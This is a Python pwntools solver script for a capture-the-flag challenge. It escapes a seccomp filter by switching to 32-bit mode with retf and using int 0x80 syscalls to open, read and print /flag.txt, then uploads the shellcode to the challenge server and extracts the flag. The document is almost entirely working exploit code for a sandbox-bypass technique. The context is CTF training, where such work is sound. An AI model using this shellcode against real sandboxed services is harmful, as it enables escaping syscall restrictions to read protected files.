#!/usr/bin/python

from pwn import *

# 89, 2, 56, 57, 58, 59, 85, 257, 322, 0, 17, 19
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
#  0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
#  0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
#  0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
#  0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
#  0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
#  0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
#  0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
#  0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
#  0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
#  0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
#  0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
#  0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
#  0015: 0x06 0x00 0x00 0x00000000  return KILL
#  0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW

context.arch = 'amd64'

shellcode = '''
    sub rbp, 0xff8
    mov rsp, rbp
    add rsp, 0x10
    push 0x23
    sub rsp, 0x4
    add rdi, 0x1d
    add [rsp], rdi
    retf
    
    push 0x74
    push 0x78742e67
    push 0x616c662f
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx, eax
    mov ecx, esp
    mov edx, 0x50
    mov eax, 3
    int 0x80
    
    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x50
    int 0x80
'''

def upload_file(raw):
    u = 'http://challenge.ctf.games:32576/upload.php'
    a = {'fileToUpload' : ['solver.bin', raw]}
    b = {'submit' : 'Upload File'}
    c = requests.post(u, files=a, data=b)
    return c.text

import requests
import re

shellcode = asm(shellcode)
response  = upload_file(shellcode)
flag = re.search("flag{.*}", response).group()

print flag
